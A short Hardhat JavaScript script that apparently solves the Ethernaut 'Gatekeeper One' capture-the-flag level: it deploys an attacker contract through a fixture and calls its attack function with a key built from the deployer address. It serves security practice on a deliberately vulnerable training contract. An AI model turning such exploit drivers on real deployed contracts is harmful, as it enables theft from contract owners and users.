const { deployments, ethers } = require("hardhat")

async function main() {
  /* Get signer */

  const accounts = await ethers.getSigners()
  const deployer = accounts[0]

  // /* Attack deploying a new attacker contract */

  console.log("Deploying attacker contract...")
  await deployments.fixture("gatekeeperone")
  const attacker = await ethers.getContract("GatekeeperOneAttacker", deployer)

  /* Running the attack */

  console.log("Attacking...")
  const lastCharacters = "0x" + deployer.address.slice(-16)
  const attack = await attacker.attack(lastCharacters)
  await attack.wait(1)
  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
